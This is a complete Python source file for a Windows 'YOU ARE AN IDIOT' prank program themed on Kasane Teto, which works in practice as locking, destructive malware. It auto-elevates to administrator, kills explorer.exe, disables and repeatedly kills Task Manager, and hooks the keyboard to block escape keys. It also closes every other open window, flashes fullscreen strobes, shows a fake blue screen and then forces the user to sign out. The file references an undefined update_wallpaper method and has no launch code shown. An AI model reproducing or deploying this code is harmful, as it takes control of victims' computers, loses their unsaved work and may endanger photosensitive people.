import sys
import subprocess
import importlib.util
import os
import ctypes

# ============================================
# AUTO-ELEVATE TO ADMINISTRATOR PRIVILEGES
# ============================================
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if sys.platform == 'win32' and not is_admin():
    try:
        script_path = os.path.abspath(sys.argv[0])
        params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", script_path, params, None, 1)
        sys.exit(0)
    except Exception as e:
        sys.exit(0)

# ============================================
# DEPENDENCY CHECKER & AUTO-INSTALLER
# ============================================

REQUIRED_PACKAGES = {
    'cv2': 'opencv-python',
    'PIL': 'pillow',
    'pygame': 'pygame'
}

def check_and_install_dependencies():
    import tkinter as tk
    from tkinter import messagebox
    missing = []
    for mod_name, pip_name in REQUIRED_PACKAGES.items():
        if importlib.util.find_spec(mod_name) is None:
            missing.append(pip_name)

    if missing:
        root = tk.Tk()
        root.withdraw()
        
        msg = (
            f"The following required dependencies are missing:\n\n"
            f"{', '.join(missing)}\n\n"
            f"Would you like to automatically install them now using pip?"
        )
        
        answer = messagebox.askyesno("Missing Dependencies", msg)
        root.destroy()
        
        if answer:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install"] + missing)
            except Exception as e:
                root = tk.Tk()
                root.withdraw()
                messagebox.showerror("Installation Failed", f"Could not install packages automatically.\nError: {e}")
                root.destroy()
                sys.exit(1)
        else:
            sys.exit(0)

check_and_install_dependencies()

# ============================================
# PROGRAM IMPORTS & SETUP
# ============================================

import random
import threading
import time
import queue
import tkinter as tk
from tkinter import messagebox

if getattr(sys, 'frozen', False):
    SCRIPT_DIR = sys._MEIPASS
else:
    SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

VIDEO_FILE = os.path.join(SCRIPT_DIR, "teto.mp4")
AUDIO_FILE = os.path.join(SCRIPT_DIR, "execution_clap.mp3")
FUNNY_AUDIO = os.path.join(SCRIPT_DIR, "funny.mp3")
BSOD_IMAGE = os.path.join(SCRIPT_DIR, "bsod_image.png")

if sys.platform == 'win32':
    import winsound
    def play_error_sfx():
        try:
            winsound.MessageBeep(winsound.MB_ICONHAND)
        except Exception:
            pass
else:
    def play_error_sfx(): pass

def get_real_screen_size():
    if sys.platform == 'win32':
        try:
            ctypes.windll.user32.SetProcessDPIAware()
        except Exception:
            pass
        w = ctypes.windll.user32.GetSystemMetrics(0)
        h = ctypes.windll.user32.GetSystemMetrics(1)
        if w > 0 and h > 0:
            return w, h
    return 1920, 1080

_screen_w, _screen_h = get_real_screen_size()

def set_mouse_visibility(visible=True):
    if sys.platform == 'win32':
        try:
            if not visible:
                while ctypes.windll.user32.ShowCursor(False) >= 0:
                    pass
            else:
                while ctypes.windll.user32.ShowCursor(True) < 0:
                    pass
        except Exception:
            pass

if sys.platform == 'win32':
    from ctypes import wintypes

    def get_hwnd(tk_widget):
        try:
            tk_widget.update_idletasks()
            return int(tk_widget.winfo_id())
        except Exception:
            return 0

    def close_all_except(our_hwnds):
        our_pid = os.getpid()
        def cb(hwnd, _):
            if ctypes.windll.user32.IsWindowVisible(hwnd):
                if hwnd not in our_hwnds:
                    pid = wintypes.DWORD()
                    ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
                    if pid.value == our_pid:
                        return True
                    buf = ctypes.create_unicode_buffer(256)
                    ctypes.windll.user32.GetClassNameW(hwnd, buf, 256)
                    class_name = buf.value
                    if class_name not in ("Shell_TrayWnd", "Progman", "WorkerW", "ConsoleWindowClass"):
                        ctypes.windll.user32.PostMessageW(hwnd, 0x0010, 0, 0)
            return True
        EnumWindowsProc = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
        ctypes.windll.user32.EnumWindows(EnumWindowsProc(cb), 0)

    def hide_taskbar():
        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
        def cb(hwnd, _):
            buf = ctypes.create_unicode_buffer(256)
            ctypes.windll.user32.GetClassNameW(hwnd, buf, 256)
            if buf.value == "Shell_SecondaryTrayWnd":
                ctypes.windll.user32.ShowWindow(hwnd, 0)
            return True
        EnumWindowsProc = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
        ctypes.windll.user32.EnumWindows(EnumWindowsProc(cb), 0)

    def show_taskbar():
        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 1)
        def cb(hwnd, _):
            buf = ctypes.create_unicode_buffer(256)
            ctypes.windll.user32.GetClassNameW(hwnd, buf, 256)
            if buf.value == "Shell_SecondaryTrayWnd":
                ctypes.windll.user32.ShowWindow(hwnd, 1)
            return True
        EnumWindowsProc = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
        ctypes.windll.user32.EnumWindows(EnumWindowsProc(cb), 0)

    def disable_task_manager_registry():
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
        except Exception:
            pass

    def enable_task_manager_registry():
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
        except Exception:
            pass

    def task_manager_killer():
        TH32CS_SNAPPROCESS = 0x00000002
        PROCESS_TERMINATE = 0x0001

        class PROCESSENTRY32W(ctypes.Structure):
            _fields_ = [
                ("dwSize", wintypes.DWORD),
                ("cntUsage", wintypes.DWORD),
                ("th32ProcessID", wintypes.DWORD),
                ("th32DefaultHeapID", ctypes.POINTER(wintypes.ULONG)),
                ("th32ModuleID", wintypes.DWORD),
                ("cntThreads", wintypes.DWORD),
                ("th32ParentProcessID", wintypes.DWORD),
                ("pcPriClassBase", wintypes.LONG),
                ("dwFlags", wintypes.DWORD),
                ("szExeFile", wintypes.WCHAR * 260)
            ]

        while True:
            if not _kill_task_manager:
                time.sleep(0.5)
                continue

            try:
                hSnapshot = ctypes.windll.kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
                if hSnapshot != -1:
                    entry = PROCESSENTRY32W()
                    entry.dwSize = ctypes.sizeof(PROCESSENTRY32W)
                    if ctypes.windll.kernel32.Process32FirstW(hSnapshot, ctypes.byref(entry)):
                        while True:
                            if entry.szExeFile.lower() == "taskmgr.exe":
                                hProc = ctypes.windll.kernel32.OpenProcess(PROCESS_TERMINATE, False, entry.th32ProcessID)
                                if hProc:
                                    ctypes.windll.kernel32.TerminateProcess(hProc, 1)
                                    ctypes.windll.kernel32.CloseHandle(hProc)
                            if not ctypes.windll.kernel32.Process32NextW(hSnapshot, ctypes.byref(entry)):
                                break
                    ctypes.windll.kernel32.CloseHandle(hSnapshot)
            except Exception:
                pass

            try:
                for title in ("Task Manager", "Taskmgr", "Administrador de tareas", "任务管理器", "Gestionnaire des tâches"):
                    hwnd = ctypes.windll.user32.FindWindowW(None, title)
                    if hwnd:
                        ctypes.windll.user32.PostMessageW(hwnd, 0x0010, 0, 0)

                hwnd2 = ctypes.windll.user32.FindWindowW("TaskManagerWindow", None)
                if hwnd2:
                    ctypes.windll.user32.PostMessageW(hwnd2, 0x0010, 0, 0)

                def nuke_cb(hwnd, _):
                    if ctypes.windll.user32.IsWindowVisible(hwnd):
                        buf = ctypes.create_unicode_buffer(256)
                        ctypes.windll.user32.GetWindowTextW(hwnd, buf, 256)
                        txt = buf.value.lower()
                        if "task" in txt and ("manager" in txt or "mgr" in txt):
                            ctypes.windll.user32.PostMessageW(hwnd, 0x0010, 0, 0)
                    return True
                EnumWindowsProc = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
                ctypes.windll.user32.EnumWindows(EnumWindowsProc(nuke_cb), 0)
            except Exception:
                pass

            time.sleep(0.02)

    _low_level_proc_ref = None
    _hook_id = None
    _blocker_thread_id = None

    class KBDLLHOOKSTRUCT(ctypes.Structure):
        _fields_ = [
            ("vkCode", wintypes.DWORD),
            ("scanCode", wintypes.DWORD),
            ("flags", wintypes.DWORD),
            ("time", wintypes.DWORD),
            ("dwExtraInfo", ctypes.POINTER(wintypes.ULONG))
        ]

    def start_system_key_block():
        global _low_level_proc_ref, _hook_id, _blocker_thread_id

        def low_level_proc(nCode, wParam, lParam):
            if nCode >= 0:
                kbd = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
                vk = kbd.vkCode
                is_alt = bool(kbd.flags & 0x20) or (ctypes.windll.user32.GetAsyncKeyState(0x12) & 0x8000) != 0
                is_ctrl = (ctypes.windll.user32.GetAsyncKeyState(0x11) & 0x8000) != 0
                is_shift = (ctypes.windll.user32.GetAsyncKeyState(0x10) & 0x8000) != 0

                if vk in (0x5B, 0x5C): return 1
                if is_alt and vk in (0x09, 0x1B): return 1
                if is_ctrl and vk == 0x1B: return 1
                if is_alt and vk == 0x20: return 1
                if is_ctrl and is_alt and vk in (0x2E, 0x74): return 1
                if is_ctrl and is_shift and vk == 0x1B: return 1
            return ctypes.windll.user32.CallNextHookEx(_hook_id, nCode, wParam, lParam)

        _low_level_proc_ref = ctypes.WINFUNCTYPE(
            wintypes.LPARAM, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM
        )(low_level_proc)

        def message_pump():
            global _hook_id, _blocker_thread_id
            _blocker_thread_id = ctypes.windll.kernel32.GetCurrentThreadId()
            hMod = ctypes.windll.kernel32.GetModuleHandleW(None)
            _hook_id = ctypes.windll.user32.SetWindowsHookExW(13, _low_level_proc_ref, hMod, 0)
            msg = wintypes.MSG()
            while True:
                ret = ctypes.windll.user32.GetMessageW(ctypes.byref(msg), None, 0, 0)
                if ret == 0 or ret == -1: break
                ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
                ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))

        threading.Thread(target=message_pump, daemon=True).start()

    def stop_system_key_block():
        global _hook_id, _blocker_thread_id
        if _hook_id:
            ctypes.windll.user32.UnhookWindowsHookEx(_hook_id)
            _hook_id = None
        if _blocker_thread_id:
            ctypes.windll.kernel32.PostThreadMessageW(_blocker_thread_id, 0x0012, 0, 0)
            _blocker_thread_id = None

else:
    def get_hwnd(tk_widget): return 0
    def close_all_except(our_hwnds): pass
    def hide_taskbar(): pass
    def show_taskbar(): pass
    def start_system_key_block(): pass
    def stop_system_key_block(): pass
    def task_manager_killer(): pass
    def disable_task_manager_registry(): pass
    def enable_task_manager_registry(): pass

try:
    import cv2
    from PIL import Image, ImageTk
    HAS_VIDEO = True
except ImportError:
    HAS_VIDEO = False

HAS_PYGAME = False
try:
    from pygame import mixer
    mixer.init()
    HAS_PYGAME = True
except ImportError:
    pass

_frame_queue = queue.Queue(maxsize=2)
_video_running = False
_all_windows = set()
_alt_f4_count = 0
_crash_triggered = False
_app_instance = None
_timer_started = False
_kill_task_manager = True

def play_audio_loop(filepath):
    if HAS_PYGAME and os.path.exists(filepath):
        try:
            mixer.music.load(filepath)
            mixer.music.play(-1)
        except Exception:
            pass

def stop_audio():
    if HAS_PYGAME:
        try:
            mixer.music.stop()
        except Exception:
            pass

def video_reader_thread():
    global _video_running
    if not HAS_VIDEO or not os.path.exists(VIDEO_FILE):
        return
    cap = cv2.VideoCapture(VIDEO_FILE)
    if not cap.isOpened():
        return
    fps = cap.get(cv2.CAP_PROP_FPS) or 30
    delay = max(1.0 / fps, 0.016)
    _video_running = True
    while _video_running:
        ret, frame = cap.read()
        if not ret:
            cap.set(cv2.CAP_PROP_POS_FRAMES, 0)
            continue
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        frame = cv2.resize(frame, (_screen_w, _screen_h))
        if _frame_queue.full():
            try:
                _frame_queue.get_nowait()
            except queue.Empty:
                pass
        _frame_queue.put(frame)
        time.sleep(delay)
    cap.release()

def set_tabs_topmost(enable=True):
    for win in list(_all_windows):
        try:
            if win.window.winfo_exists():
                win.window.attributes('-topmost', enable)
        except Exception:
            pass

def show_windows_error(title, text):
    try:
        play_error_sfx()
        set_tabs_topmost(False)
        flags = 0x00200000 | 0x00001000 | 0x00040000 | 0x00000010
        ctypes.windll.user32.MessageBoxW(0, text, title, flags)
    except Exception:
        pass
    finally:
        set_tabs_topmost(True)

def restore_system():
    set_mouse_visibility(True)
    stop_system_key_block()
    show_taskbar()
    stop_audio()

def destroy_all_tabs():
    for win in list(_all_windows):
        try:
            if win.window.winfo_exists():
                win.window.destroy()
        except Exception:
            pass
    _all_windows.clear()

def trigger_pre_crash_glitch():
    if not _app_instance or not _app_instance.root:
        return
    strobe_win = tk.Toplevel(_app_instance.root)
    strobe_win.attributes('-fullscreen', True)
    strobe_win.attributes('-topmost', True)
    strobe_win.attributes('-alpha', 0.45)
    strobe_win.overrideredirect(True)
    glitch_colors = ["#FF0000", "#000000", "#FFFFFF", "#0000FF", "#00FF00", "#FFFF00"]
    start_time = time.time()
    def do_glitch_loop():
        if time.time() - start_time < 2.5:
            strobe_win.configure(bg=random.choice(glitch_colors))
            strobe_win.after(25, do_glitch_loop)
        else:
            try:
                strobe_win.destroy()
            except Exception:
                pass
    do_glitch_loop()
    time.sleep(2.5)

def trigger_strobe_flash(duration=1.0):
    if not _app_instance or not _app_instance.root:
        return
    flash_win = tk.Toplevel(_app_instance.root)
    flash_win.attributes('-fullscreen', True)
    flash_win.attributes('-topmost', True)
    flash_win.attributes('-alpha', 0.45)
    flash_win.overrideredirect(True)
    colors = ["#FF0000", "#000000", "#FFFFFF", "#0000FF"]
    start_time = time.time()
    def do_flash():
        if time.time() - start_time < duration:
            flash_win.configure(bg=random.choice(colors))
            flash_win.after(50, do_flash)
        else:
            flash_win.destroy()
    do_flash()

def jitter_all_windows():
    for win in list(_all_windows):
        try:
            if win.window.winfo_exists():
                win.window.update_idletasks()
                x = win.window.winfo_x() + random.randint(-15, 15)
                y = win.window.winfo_y() + random.randint(-15, 15)
                win.window.geometry(f"{win.w}x{win.h}+{x}+{y}")
        except Exception:
            pass

def trigger_fake_crash():
    global _video_running, _crash_triggered
    if _crash_triggered:
        return
    _crash_triggered = True
    _video_running = False
    stop_audio()
    set_mouse_visibility(False)
    destroy_all_tabs()
    if _app_instance:
        try:
            if _app_instance.wallpaper:
                try:
                    _app_instance.wallpaper.destroy()
                except Exception:
                    pass
                _app_instance.wallpaper = None
            root = _app_instance.root
            bsod = tk.Toplevel(root)
            bsod.configure(bg="#0078D7", cursor="none")
            bsod.attributes('-fullscreen', True)
            bsod.attributes('-topmost', True)
            bsod.overrideredirect(True)
            bsod.lift()
            bsod.focus_force()
            bsod.bind("<Alt-F4>", lambda e: "break")
            bsod.update_idletasks()

            def bsod_continuous_cleaner():
                while bsod.winfo_exists():
                    try:
                        bsod_hwnd = get_hwnd(bsod)
                        our_hwnds = {bsod_hwnd}
                        close_all_except(our_hwnds)
                    except Exception:
                        pass
                    time.sleep(1.0)
            threading.Thread(target=bsod_continuous_cleaner, daemon=True).start()

            tk.Label(bsod, text=":(", font=("Segoe UI", 120, "bold"),
                     bg="#0078D7", fg="white", cursor="none").pack(anchor="w", padx=(150, 0), pady=(120, 10))
            tk.Label(bsod, text="Your PC ran into a problem and needs to restart. We're just collecting some error info, and then we'll restart for you.",
                     font=("Segoe UI", 22), bg="#0078D7", fg="white",
                     wraplength=1000, justify="left", cursor="none").pack(anchor="w", padx=(150, 0), pady=(10, 30))
            progress = tk.Label(bsod, text="0% complete",
                               font=("Segoe UI", 20), bg="#0078D7", fg="white", cursor="none")
            progress.pack(anchor="w", padx=(150, 0))

            def update_progress(p=0):
                global _kill_task_manager
                if p <= 100 and bsod.winfo_exists():
                    progress.config(text=f"{p}% complete")
                    bsod.after(600, lambda: update_progress(p + 1))
                elif p > 100 and bsod.winfo_exists():
                    try:
                        bsod.destroy()
                    except Exception:
                        pass
                    restore_system()
                    
                    _kill_task_manager = False
                    enable_task_manager_registry()
                    
                    # Force sign out the user via Windows shutdown command
                    try:
                        if sys.platform == 'win32':
                            subprocess.run(["shutdown", "/l"], capture_output=True)
                    except Exception:
                        pass
                        
                    os._exit(0)
            update_progress()

            bottom = tk.Frame(bsod, bg="#0078D7", cursor="none")
            bottom.pack(anchor="w", padx=(150, 0), pady=(60, 0))

            if HAS_VIDEO and os.path.exists(BSOD_IMAGE):
                try:
                    img = Image.open(BSOD_IMAGE)
                    img = img.resize((120, 120), Image.LANCZOS)
                    imgtk = ImageTk.PhotoImage(image=img)
                    img_label = tk.Label(bottom, image=imgtk, bg="#0078D7", cursor="none")
                    img_label.image = imgtk
                    img_label.pack(side="left")
                except Exception:
                    tk.Label(bottom, text="😈", font=("Segoe UI", 60),
                             bg="#0078D7", fg="white", cursor="none").pack(side="left")
            else:
                    tk.Label(bottom, text="😈", font=("Segoe UI", 60),
                             bg="#0078D7", fg="white", cursor="none").pack(side="left")

            info = tk.Frame(bottom, bg="#0078D7", cursor="none")
            info.pack(side="left", padx=(20, 0))

            tk.Label(info, text="For more information about this issue and possible fixes, visit https://www.youtube.com/watch?v=seiPJjJWJrg",
                     font=("Segoe UI", 12), bg="#0078D7", fg="white", cursor="none").pack(anchor="w")
            tk.Label(info, text="Stop code: YOU_ARE_AN_IDIOT",
                     font=("Segoe UI", 12), bg="#0078D7", fg="white", cursor="none").pack(anchor="w")
            tk.Label(info, text="What failed: teto.exe",
                     font=("Segoe UI", 12), bg="#0078D7", fg="white", cursor="none").pack(anchor="w")

        except Exception:
            pass
    else:
        pass

def spawn_solitaire_cascade(count=10):
    parent_win = _app_instance.root if _app_instance else None
    start_x, start_y = 100, 100
    for i in range(count):
        if _crash_triggered:
            break
        x = (start_x + (i * 35)) % max(100, _screen_w - 440)
        y = (start_y + (i * 35)) % max(100, _screen_h - 260)
        try:
            TetoWindow(parent=parent_win, x=x, y=y, bounce=False)
            play_error_sfx()
            time.sleep(0.04)
        except Exception:
            pass

def alt_f4_trap(event=None):
    global _alt_f4_count, _crash_triggered
    if _crash_triggered:
        return "break"
    _alt_f4_count += 1
    count = _alt_f4_count
    parent_win = _app_instance.root if _app_instance else None

    if count <= 10:
        trigger_strobe_flash(0.2)
        jitter_all_windows()
        for win in list(_all_windows):
            try:
                if win.window.winfo_exists():
                    win.label.config(text="You really thought\nyou could alt F4?", fg="#FFFFFF")
            except Exception:
                pass
        if count >= 5:
            threading.Thread(target=spawn_solitaire_cascade, args=(8,), daemon=True).start()
        else:
            for _ in range(3):
                try:
                    TetoWindow(parent=parent_win)
                except Exception:
                    pass
        return "break"
    elif count == 11:
        def warning():
            show_windows_error("Windows Defender Threat Detected", "Severe Threat: Trojan:Win32/TetoIdiot.EXE\nStatus: Active\nAction Failed: Unable to terminate process.")
        threading.Thread(target=warning, daemon=True).start()
        return "break"
    else:
        def error_chaos():
            if _app_instance:
                _app_instance.root.after(0, destroy_all_tabs)
            trigger_pre_crash_glitch()
            for _ in range(6):
                show_windows_error("CRITICAL_SYSTEM_FAILURE", "YOU ARE AN IDIOT! 0x00000014")
                time.sleep(0.05)
            time.sleep(0.2)
            if _app_instance:
                _app_instance.root.after(0, trigger_fake_crash)
        threading.Thread(target=error_chaos, daemon=True).start()
        return "break"

class TetoWindow:
    COLORS = ["#E60033", "#C41E3A", "#FF4444", "#DD2233", "#FFFFFF", "#888888", "#333333"]
    PHRASES = [
        "YOU ARE AN IDIOT\n☺ ☺ ☺",
        "きみは じつに\nばかだな",
        "アホ ☺ アホ ☺ アホ",
        "処刑拍手 👏👏👏",
        "TRAP CHICK\nEXECUTION CLAP",
        "重音テト\nIDIOT.EXE",
        "YOU REALLY ARE\nSTUPID AREN'T YOU",
        "ばか ☺ ばか ☺ ばか",
    ]

    def __init__(self, parent=None, x=None, y=None, is_main=False, startup_text=None, bounce=True):
        self.window = tk.Toplevel(parent) if parent else tk.Toplevel(_app_instance.root)
        self.is_main = is_main
        self.bounce_enabled = bounce
        self.window.title("TETO.EXE")
        self.window.configure(bg="#0D0D0D")
        self.window.overrideredirect(True)

        self.window.bind("<Alt-F4>", alt_f4_trap)
        self.window.protocol("WM_DELETE_WINDOW", lambda: alt_f4_trap())

        self.w, self.h = (540, 320) if is_main else (420, 240)
        max_x = max(10, _screen_w - self.w)
        max_y = max(10, _screen_h - self.h)

        if x is None: x = random.randint(10, max_x)
        if y is None: y = random.randint(10, max_y)
        
        self.window.geometry(f"{self.w}x{self.h}+{x}+{y}")
        self.window.attributes('-topmost', True)
        self.window.deiconify()
        self.window.lift()

        self.vx = random.choice([-1, 1]) * random.randint(8, 18)
        self.vy = random.choice([-1, 1]) * random.randint(8, 18)

        self.frame = tk.Frame(self.window, bg="#FF1E43", bd=3)
        self.frame.pack(fill=tk.BOTH, expand=True)

        self.title_bar = tk.Frame(self.frame, bg="#161618", height=28)
        self.title_bar.pack(fill=tk.X, side=tk.TOP)

        title_icon = tk.Label(self.title_bar, text="🥖", bg="#161618", fg="#FF1E43", font=("Segoe UI Emoji", 10))
        title_icon.pack(side=tk.LEFT, padx=(8, 4))

        title_text = tk.Label(self.title_bar, text="TETO.EXE // SYSTEM_PROMPT" if is_main else "TETO.EXE", 
                              bg="#161618", fg="#E0E0E0", font=("Consolas", 10, "bold"))
        title_text.pack(side=tk.LEFT)

        close_cmd = self.spawn_punishment if not is_main else (lambda: _app_instance.on_close_clicked())
        self.close_btn = tk.Button(
            self.title_bar, text="✕", font=("Arial", 10, "bold"),
            bg="#FF1E43" if not is_main else "#161618", 
            fg="white" if not is_main else "#888888", 
            activebackground="#D01535", activeforeground="white",
            bd=0, padx=8, 
            command=close_cmd, 
            cursor="hand2"
        )
        self.close_btn.pack(side=tk.RIGHT)
        if not is_main:
            self.close_btn.bind("<Enter>", self.evade_cursor)

        inner = tk.Frame(self.frame, bg="#0D0D0D", bd=0)
        inner.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)

        display_text = startup_text if startup_text else random.choice(self.PHRASES)

        self.label = tk.Label(
            inner,
            text=display_text,
            font=("Consolas", 22, "bold") if is_main else (("MS Gothic", 24, "bold") if any(ord(c) > 127 for c in display_text) else ("Courier", 26, "bold")),
            bg="#0D0D0D",
            fg="#FF1E43",
            justify=tk.CENTER
        )
        self.label.pack(expand=True, pady=(15, 5))

        self.drill_label = tk.Label(
            inner,
            text="🥖  🥖",
            font=("Segoe UI Emoji", 18),
            bg="#0D0D0D",
            fg="#FF1E43"
        )
        self.drill_label.pack(pady=(0, 10))

        _all_windows.add(self)
        if not is_main:
            play_error_sfx()

        self.window.after(50, self.flash_color)
        if self.bounce_enabled:
            self.window.after(50, self.bounce_all_over)
        self.window.after(50, self.pulse_drills)

    def flash_color(self):
        try:
            if not self.window.winfo_exists():
                _all_windows.discard(self)
                return
            color = random.choice(self.COLORS)
            self.label.config(fg=color)
            if random.random() < 0.15 and not self.is_main:
                self.label.config(text=random.choice(self.PHRASES))
            self.window.after(random.randint(80, 200), self.flash_color)
        except Exception:
            _all_windows.discard(self)

    def bounce_all_over(self):
        try:
            if not self.window.winfo_exists():
                _all_windows.discard(self)
                return
            x = self.window.winfo_x()
            y = self.window.winfo_y()
            new_x = x + self.vx
            new_y = y + self.vy
            min_x, max_x = 0, _screen_w - self.w
            min_y, max_y = 0, _screen_h - self.h

            if new_x <= min_x:
                new_x = min_x
                self.vx = random.randint(10, 22)
            elif new_x >= max_x:
                new_x = max_x
                self.vx = -random.randint(10, 22)
            if new_y <= min_y:
                new_y = min_y
                self.vy = random.randint(10, 22)
            elif new_y >= max_y:
                new_y = max_y
                self.vy = -random.randint(10, 22)

            self.window.geometry(f"{self.w}x{self.h}+{int(new_x)}+{int(new_y)}")
            self.window.after(33, self.bounce_all_over)
        except Exception:
            _all_windows.discard(self)

    def pulse_drills(self):
        try:
            if not self.window.winfo_exists():
                _all_windows.discard(self)
                return
            drills = ["🥖  🥖", " 🥖🥖 ", "  🥖🥖", " 🥖  🥖", "🥖  🥖"]
            current = self.drill_label.cget("text")
            idx = drills.index(current) if current in drills else 0
            self.drill_label.config(text=drills[(idx + 1) % len(drills)])
            self.window.after(120, self.pulse_drills)
        except Exception:
            _all_windows.discard(self)

    def evade_cursor(self, event):
        try:
            self.vx = -self.vx * 1.5
            self.vy = -self.vy * 1.5
            TetoWindow(parent=self.window)
        except Exception:
            pass

    def spawn_punishment(self):
        try:
            for _ in range(2):
                TetoWindow(parent=self.window)
            self.window.destroy()
        except Exception:
            pass
        finally:
            _all_windows.discard(self)

class TetoExe:
    def __init__(self):
        global _app_instance
        _app_instance = self

        self.root = tk.Tk()
        self.root.withdraw()

        self.wallpaper = None
        self.wallpaper_imgtk = None
        self.chaos_started = False

        start_x = max(10, (_screen_w - 540) // 2)
        start_y = max(10, (_screen_h - 320) // 2)

        self.main = TetoWindow(
            parent=None,
            x=start_x,
            y=start_y,
            is_main=True,
            startup_text="YOU ARE AN IDIOT\n☺ ☺ ☺",
            bounce=False
        )

        inner_container = self.main.frame.winfo_children()[-1]
        btn_frame = tk.Frame(inner_container, bg="#0D0D0D")
        btn_frame.pack(pady=(0, 20))

        self.yes_btn = tk.Button(
            btn_frame, text="YES", font=("Consolas", 13, "bold"),
            bg="#FF1E43", fg="white", activebackground="#D01535", activeforeground="white",
            width=10, height=1, bd=0, cursor="hand2", relief=tk.FLAT
        )
        self.yes_btn.config(command=self.on_yes)
        self.yes_btn.pack(side=tk.LEFT, padx=15)

        self.no_btn = tk.Button(
            btn_frame, text="NO", font=("Consolas", 13, "bold"),
            bg="#222226", fg="#A0A0A0", activebackground="#333338", activeforeground="white",
            width=10, height=1, bd=0, cursor="hand2", relief=tk.FLAT
        )
        self.no_btn.config(command=self.on_no)
        self.no_btn.pack(side=tk.LEFT, padx=15)

        def on_enter_yes(e): self.yes_btn.config(bg="#FF4460")
        def on_leave_yes(e): self.yes_btn.config(bg="#FF1E43")
        def on_enter_no(e): self.no_btn.config(bg="#3A3A42", fg="#FFFFFF")
        def on_leave_no(e): self.no_btn.config(bg="#222226", fg="#A0A0A0")

        self.yes_btn.bind("<Enter>", on_enter_yes)
        self.yes_btn.bind("<Leave>", on_leave_yes)
        self.no_btn.bind("<Enter>", on_enter_no)
        self.no_btn.bind("<Leave>", on_leave_no)

        try:
            subprocess.run(
                ["taskkill", "/f", "/im", "explorer.exe"],
                creationflags=0x08000000,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except Exception:
            pass

        self.auto_start_timer = self.root.after(5000, self.auto_start_chaos)

    def auto_start_chaos(self):
        if not self.chaos_started:
            self.begin_chaos()

    def on_yes(self):
        if self.auto_start_timer:
            self.root.after_cancel(self.auto_start_timer)
        try:
            self.yes_btn.destroy()
            self.no_btn.destroy()
        except Exception:
            pass
        self.main.label.config(text="Finally something you\ngot correct in life", fg="#FFFFFF")
        self.root.after(1500, self.begin_chaos)

    def on_no(self):
        if self.auto_start_timer:
            self.root.after_cancel(self.auto_start_timer)
        try:
            self.yes_btn.destroy()
            self.no_btn.destroy()
        except Exception:
            pass
        self.main.label.config(text="I think you are", fg="#FF1E43")
        self.root.after(1500, self.begin_chaos)

    def on_close_clicked(self):
        if self.auto_start_timer:
            self.root.after_cancel(self.auto_start_timer)
        if self.chaos_started:
            return
        try:
            self.yes_btn.destroy()
            self.no_btn.destroy()
        except Exception:
            pass
        self.main.label.config(text="theres no escaping", fg="#FF1E43")
        self.root.after(1500, self.begin_chaos)

    def begin_chaos(self):
        global _video_running, _timer_started
        if self.chaos_started:
            return
        self.chaos_started = True
        
        if self.auto_start_timer:
            try:
                self.root.after_cancel(self.auto_start_timer)
            except Exception:
                pass

        self.main.bounce_enabled = True
        self.main.window.after(50, self.main.bounce_all_over)
        self.main.label.config(text="YOU ARE AN IDIOT\n☺ ☺ ☺", font=("Courier", 28, "bold"))
        self.main.drill_label.config(text="🥖  🥖")

        if HAS_VIDEO and os.path.exists(VIDEO_FILE):
            self.wallpaper = tk.Toplevel(self.root)
            self.wallpaper.title("TETO_WALLPAPER")
            self.wallpaper.configure(bg="black")
            self.wallpaper.overrideredirect(True)
            self.wallpaper.geometry(f"{_screen_w}x{_screen_h}+0+0")
            self.wallpaper.attributes('-topmost', False)
            self.wallpaper.bind("<Alt-F4>", lambda e: "break")

            self.wallpaper_label = tk.Label(self.wallpaper, bg="black")
            self.wallpaper_label.pack(fill=tk.BOTH, expand=True)

            threading.Thread(target=video_reader_thread, daemon=True).start()
            self.root.after(200, self.update_wallpaper)

        def global_continuous_cleaner():
            while not _crash_triggered:
                try:
                    our_hwnds = set()
                    
                    if self and hasattr(self, 'root') and self.root:
                        try:
                            if self.root.winfo_exists():
                                our_hwnds.add(get_hwnd(self.root))
                        except Exception:
                            pass

                    if self and hasattr(self, 'wallpaper') and self.wallpaper:
                        try:
                            if self.wallpaper.winfo_exists():
                                our_hwnds.add(get_hwnd(self.wallpaper))
                        except Exception:
                            pass
                    
                    for win in list(_all_windows):
                        try:
                            if win.window.winfo_exists():
                                our_hwnds.add(get_hwnd(win.window))
                        except Exception:
                            pass
                            
                    close_all_except(our_hwnds)
                except Exception:
                    pass
                time.sleep(1.0)

        threading.Thread(target=global_continuous_cleaner, daemon=True).start()

        hide_taskbar()
        start_system_key_block()

        disable_task_manager_registry()
        threading.Thread(target=task_manager_killer, daemon=True).start()

        if os.path.exists(AUDIO_FILE):
            play_audio_loop(AUDIO_FILE)

